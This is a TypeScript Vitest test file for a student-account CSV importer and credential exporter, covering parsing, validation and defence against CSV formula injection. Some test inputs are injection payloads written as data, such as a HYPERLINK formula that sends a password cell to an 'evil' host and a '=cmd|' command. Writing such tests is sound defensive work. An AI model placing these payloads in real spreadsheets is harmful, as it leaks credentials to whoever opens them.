import { describe, expect, it } from "vitest";
import {
  credentialsCsv,
  normalizeLogin,
  parseStudentsCsv,
  validateFullName,
  validateLogin,
  validatePassword,
  MAX_IMPORT_ROWS,
} from "../../src/lib/studentsCsv";

describe("parseStudentsCsv", () => {
  it("parses a valid file with optional passwords", () => {
    const { rows, issues } = parseStudentsCsv(
      "логин,фио,пароль\nivanov,Иванов  Иван   Иванович,secret123\npetrov, Петров Пётр ,\n",
    );
    expect(issues).toEqual([]);
    expect(rows).toEqual([
      { line: 2, login: "ivanov", fullName: "Иванов Иван Иванович", password: "secret123" },
      { line: 3, login: "petrov", fullName: "Петров Пётр", password: null },
    ]);
  });

  it("accepts BOM, CRLF, ; delimiter, English headers in any order and quoted fields", () => {
    const csv = '﻿FullName;Login\r\n"Сидоров; Сидор";sidorov\r\n\r\n"Имя ""Кавычки""";q.u-o_te\r\n';
    const { rows, issues } = parseStudentsCsv(csv);
    expect(issues).toEqual([]);
    expect(rows).toEqual([
      { line: 2, login: "sidorov", fullName: "Сидоров; Сидор", password: null },
      { line: 4, login: "q.u-o_te", fullName: 'Имя "Кавычки"', password: null },
    ]);
  });

  it("reports line numbers across quoted newlines", () => {
    const { issues } = parseStudentsCsv('логин,фио\na,"Многострочное\nимя"\nb c,Имя');
    expect(issues).toEqual([{ line: 4, message: expect.stringMatching(/недопустимые символы/) }]);
  });

  it("requires a header with login and full name", () => {
    expect(parseStudentsCsv("ivanov,Иванов").issues[0]!.message).toMatch(/заголовком/);
    expect(parseStudentsCsv("").issues).toEqual([{ line: 1, message: "файл пустой." }]);
    expect(parseStudentsCsv("логин,фио\n").issues[0]!.message).toMatch(/нет ни одного студента/);
  });

  it("reports per-row errors, including case-insensitive duplicates", () => {
    const { rows, issues } = parseStudentsCsv(
      "логин,фио,пароль\nivanov,Иванов,\n,Без логина,\nnoname,,\nIvanov,Дубль,\nshort,Коротко,1234567",
    );
    expect(rows.map((r) => r.login)).toEqual(["ivanov"]);
    expect(issues).toEqual([
      { line: 3, message: "пустой логин." },
      { line: 4, message: "пустое ФИО." },
      { line: 5, message: expect.stringMatching(/уже встречается в строке 2/) },
      { line: 6, message: expect.stringMatching(/пароль короче/) },
    ]);
  });

  it("lowercases logins, so case-only duplicates are caught", () => {
    const { rows, issues } = parseStudentsCsv("логин,фио\n  Ivanov.I ,Иванов\nIVANOV.i,Дубль");
    expect(rows.map((r) => r.login)).toEqual(["ivanov.i"]);
    expect(issues).toEqual([{ line: 3, message: expect.stringMatching(/«ivanov\.i» уже встречается в строке 2/) }]);
  });

  it("rejects formula-looking full names and passwords (CSV injection)", () => {
    const { rows, issues } = parseStudentsCsv(
      'логин,фио,пароль\na,"=HYPERLINK(""http://x/?""&C2)",\nb,+Имя,\nc,Имя,@password1\nd,-Имя,\ne,@Имя,',
    );
    expect(rows).toEqual([]);
    expect(issues.map((i) => i.line)).toEqual([2, 3, 4, 5, 6]);
    expect(issues[0]!.message).toMatch(/ФИО не может начинаться/);
    expect(issues[2]!.message).toMatch(/пароль не может начинаться/);
  });

  it("flags an unclosed quote", () => {
    const { issues } = parseStudentsCsv('логин,фио\nivanov,"Иванов');
    expect(issues.some((i) => /незакрытая кавычка/.test(i.message))).toBe(true);
  });

  it("limits the number of rows", () => {
    const body = Array.from({ length: MAX_IMPORT_ROWS + 1 }, (_, i) => `u${i},Имя`).join("\n");
    const { rows, issues } = parseStudentsCsv(`логин,фио\n${body}`);
    expect(rows).toEqual([]);
    expect(issues[0]!.message).toMatch(/слишком много строк/);
  });
});

describe("validators", () => {
  it("normalizeLogin", () => {
    expect(normalizeLogin("  IvAnov ")).toBe("ivanov");
  });

  it("validateLogin", () => {
    expect(validateLogin("a.b_c-1")).toBeNull();
    expect(validateLogin("-abc")).toMatch(/недопустимые/);
    expect(validateLogin(".abc")).toMatch(/недопустимые/);
    expect(validateLogin("")).toMatch(/пустой/);
    expect(validateLogin("иванов")).toMatch(/недопустимые/);
    expect(validateLogin("a b")).toMatch(/недопустимые/);
    expect(validateLogin("a".repeat(65))).toMatch(/длиннее/);
  });

  it("validateFullName", () => {
    expect(validateFullName("Иванов")).toBeNull();
    expect(validateFullName("")).toMatch(/пустое/);
    expect(validateFullName("x".repeat(201))).toMatch(/длиннее/);
    for (const bad of ["=1+1", "+7", "-x", "@SUM(A1)", "\tИмя", "\rИмя"]) {
      expect(validateFullName(bad)).toMatch(/не может начинаться/);
    }
    expect(validateFullName("Имя-Фамилия =1")).toBeNull();
  });

  it("validatePassword", () => {
    expect(validatePassword("12345678")).toBeNull();
    expect(validatePassword("1234567")).toMatch(/короче/);
    expect(validatePassword("x".repeat(73))).toMatch(/длиннее/);
    expect(validatePassword("=cmd|x12345")).toMatch(/не может начинаться/);
    expect(validatePassword("pass=word1")).toBeNull();
  });
});

describe("credentialsCsv", () => {
  it("writes a BOM, CRLF and escapes special characters; round-trips through the parser", () => {
    const students = [
      { login: "ivanov", fullName: "Иванов Иван", password: "abcDEF234" },
      { login: "q", fullName: 'Имя, с "кавычками"; и т.д.', password: "p;ss,word" },
    ];
    const csv = credentialsCsv(students);
    expect(csv.startsWith("﻿логин,фио,пароль\r\n")).toBe(true);
    expect(csv.endsWith("\r\n")).toBe(true);
    expect(csv).toContain('"Имя, с ""кавычками""; и т.д."');
    const { rows, issues } = parseStudentsCsv(csv);
    expect(issues).toEqual([]);
    expect(rows.map(({ login, fullName, password }) => ({ login, fullName, password }))).toEqual(students);
  });

  it("neutralises cells that a spreadsheet would run as a formula", () => {
    // Can't come through validation, but the writer must be safe on its own
    // (e.g. accounts created before validation existed).
    const csv = credentialsCsv([
      { login: "a", fullName: '=HYPERLINK("http://evil/?"&C2,"x")', password: "+abc" },
      { login: "b", fullName: "@SUM(1)", password: "-1" },
      { login: "c", fullName: "\tTab", password: "\rcr" },
    ]);
    const lines = csv.replace(/^\uFEFF/, "").split("\r\n");
    expect(lines[1]).toBe(`a,"'=HYPERLINK(""http://evil/?""&C2,""x"")",'+abc`);
    expect(lines[2]).toBe("b,'@SUM(1),'-1");
    expect(lines[3]).toBe("c,'\tTab,\"'\rcr\"");
    // no cell (after unquoting) starts with a formula character
    const { issues } = parseStudentsCsv(csv);
    expect(issues.every((i) => !/не может начинаться/.test(i.message))).toBe(true);
  });
});
